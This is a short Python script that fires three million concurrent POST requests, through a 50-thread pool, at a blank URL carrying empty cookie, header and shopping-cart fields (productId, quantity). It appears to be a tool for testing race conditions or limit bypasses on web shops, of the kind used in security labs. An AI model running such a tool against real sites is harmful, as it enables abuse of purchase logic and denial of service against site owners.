import requests
import concurrent.futures

class RequestSender:
    def __init__(self, url, headers, data, num_requests, max_workers=50):
        self.url = url
        self.headers = headers
        self.data = data
        self.num_requests = num_requests
        self.max_workers = max_workers

    def send_request(self, session):
        response = session.post(self.url, headers=self.headers, data=self.data)
        if response.status_code == 200:
            print(f"[+] {self.url} | Payload: {self.data['quantity']} | Status Code: {response.status_code} | Response Length: {len(response.content)}")
        else:
            print(f"[+] {self.url} | Payload: {self.data['quantity']} | Status Code: {response.status_code} | Response Length: {len(response.content)}")

    def send_requests_concurrently(self):
        with requests.Session() as session:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = [executor.submit(self.send_request, session) for _ in range(self.num_requests)]
                for future in concurrent.futures.as_completed(futures):
                    future.result()

url = ''
headers = {
    'Cookie': '',
    'User-Agent': '',
    'Accept': '',
    'Accept-Language': '',
    'Accept-Encoding': '',
    'Content-Type': '',
    'Origin': '',
    'Referer': '',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': '',
    'Sec-Fetch-Mode': '',
    'Sec-Fetch-Site': '',
    'Sec-Fetch-User': '',
    'Te': '',
}

data = {
    'productId': '',
    'redir': '',
    'quantity': '',
}

# Create an instance of RequestSender and send requests concurrently
request_sender = RequestSender(url, headers, data, 3000000)
request_sender.send_requests_concurrently()
print("All requests completed")
